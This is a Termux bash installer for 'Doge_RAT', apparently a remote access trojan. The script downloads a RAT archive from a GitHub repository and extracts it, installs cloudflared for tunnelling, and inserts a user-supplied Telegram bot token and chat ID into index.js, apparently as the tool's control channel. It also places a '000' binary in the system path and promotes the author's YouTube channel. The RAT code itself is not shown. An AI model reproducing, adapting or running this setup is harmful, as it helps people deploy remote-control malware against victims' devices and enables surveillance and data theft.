#!/data/data/com.termux/files/usr/bin/bash

# Set terminal colors
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
RESET="\033[0m"

# Print banner
echo -e "\033[41m\033[1;37m     ██████╗ \033[42m\033[1;30m ██████╗ \033[43m\033[1;30m ████████╗\033[44m\033[1;37m██╗     \033[45m\033[1;37m    ██████╗ \033[46m\033[1;30m ██████╗ \033[47m\033[1;30m████████╗\033[0m"
echo -e "\033[41m\033[1;37m     ██╔══██╗\033[42m\033[1;30m██╔════╝ \033[43m\033[1;30m ╚══██╔══╝\033[44m\033[1;37m██║     \033[45m\033[1;37m    ██╔══██╗\033[46m\033[1;30m██╔════╝ \033[47m\033[1;30m╚══██╔══╝\033[0m"
echo -e "\033[41m\033[1;37m     ██║  ██║\033[42m\033[1;30m██║  ███╗\033[43m\033[1;30m    ██║   \033[44m\033[1;37m██║     \033[45m\033[1;37m    ██║  ██║\033[46m\033[1;30m██║  ███╗\033[47m\033[1;30m   ██║   \033[0m"
echo -e "\033[41m\033[1;37m     ██║  ██║\033[42m\033[1;30m██║   ██║\033[43m\033[1;30m    ██║   \033[44m\033[1;37m██║     \033[45m\033[1;37m    ██║  ██║\033[46m\033[1;30m██║   ██║\033[47m\033[1;30m   ██║   \033[0m"
echo -e "\033[41m\033[1;37m     ██████╔╝\033[42m\033[1;30m╚██████╔╝\033[43m\033[1;30m    ██║   \033[44m\033[1;37m███████╗\033[45m\033[1;37m    ██║  ██║\033[46m\033[1;30m╚██████╔╝\033[47m\033[1;30m   ██║   \033[0m"
echo -e "\033[41m\033[1;37m     ╚═════╝ \033[42m\033[1;30m ╚═════╝ \033[43m\033[1;30m    ╚═╝   \033[44m\033[1;37m╚══════╝\033[45m\033[1;37m    ██████╔╝\033[46m\033[1;30m ╚═════╝ \033[47m\033[1;30m   ╚═╝   \033[0m"
echo -e "${YELLOW}🔴 YouTube: https://www.youtube.com/@aryanafridi00"
echo -e "💻 Developer: Aryan Afridi"
echo -e "📡 GitHub: https://github.com/shahid2005a${RESET}"
echo ""

apt update && apt upgrade -y
pkg install openssh curl grep wget unzip tar nodejs-lts -y

if ! command -v node &> /dev/null
then
    echo "Node.js LTS not found. Installing..."
    pkg install nodejs-lts || { echo "Failed to install Node.js LTS" ; exit 1; }
else
    echo "Node.js LTS already installed"
fi

if ! command -v wget &> /dev/null
then
    echo "wget not found. Installing..."
    apt install -y wget || { echo "Failed to install wget" ; exit 1; }
else
    echo "wget already installed"
fi

# Cloudflared install
if ! command -v cloudflared &> /dev/null; then
    echo "Installing cloudflared..."
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O $PREFIX/bin/cloudflared
    chmod +x $PREFIX/bin/cloudflared
fi

# ==== DGTL-RT.tar.gz AUTO DOWNLOAD + EXTRACT ====
if [ ! -f "$HOME/Doge_RAT/index.js" ]; then
    echo "[*] Downloading DGTL-RT.tar.gz..."
    mkdir -p $HOME/Doge_RAT
    cd $HOME/Doge_RAT
    wget -q https://github.com/shahid2005a/DGTL-RT/raw/refs/heads/main/DGTL-RT.tar.gz -O DGTL-RT.tar.gz

    if [ -f "DGTL-RT.tar.gz" ]; then
        echo "[*] Extracting..."
        tar -xzf DGTL-RT.tar.gz
        rm -f DGTL-RT.tar.gz

        [ -d "$HOME/Doge_RAT/000_rat" ] && mv $HOME/Doge_RAT/000_rat/* $HOME/Doge_RAT/ 2>/dev/null && rmdir $HOME/Doge_RAT/000_rat 2>/dev/null
        [ -d "$HOME/Doge_RAT/DGTL-RT" ] && mv $HOME/Doge_RAT/DGTL-RT/* $HOME/Doge_RAT/ 2>/dev/null && rmdir $HOME/Doge_RAT/DGTL-RT 2>/dev/null

        echo "[✓] Extracted"
    else
        echo "[!] Download failed!"
        exit 1
    fi
fi

# ==== node_modules (agar zip me nahi hai) ====
if [ ! -d "$HOME/Doge_RAT/node_modules" ]; then
    if [ -f "$HOME/Doge_RAT/node_modules.zip" ]; then
        cd $HOME/Doge_RAT
        unzip -q node_modules.zip
        rm -f node_modules.zip
    fi
fi

if [ ! -f "$HOME/Doge_RAT/index.js" ]; then
    echo "[!] index.js not found!"
    exit 1
fi

echo -n "Loading "
timeout 5s bash -c 'while true; do echo -n "."; sleep 1; done'
echo " Done!"

echo -e "${CYAN}Enter Your Telegram Bot Token${RESET}"
read -p "bot token: " token
echo -e "${CYAN}Enter Your Telegram Chat ID${RESET}"
read -p "ID: " id

sed -i "s/const token = 'your token here'/const token = '$token'/g" $HOME/Doge_RAT/index.js
sed -i "s/const id = 'chat id here'/const id = '$id'/g" $HOME/Doge_RAT/index.js

echo "Setup successfully!"

# ==== 000 install ====
if [ -f "$HOME/Doge_RAT/000" ]; then
    cp $HOME/Doge_RAT/000 $HOME/000
    chmod +x $HOME/000
    mv -f $HOME/000 $PREFIX/bin/000
    chmod +x $PREFIX/bin/000
fi

echo -n "Subscribe My Channel "
timeout 2s bash -c 'while true; do echo -n "."; sleep 1; done'
echo -e "\e[92mSUBSCRIBE My YOUTUBE Channel\e[0m.....\e[94m[\e[92m✓\e[94m]\e[0m"
termux-open-url https://youtube.com/@aryanafridi00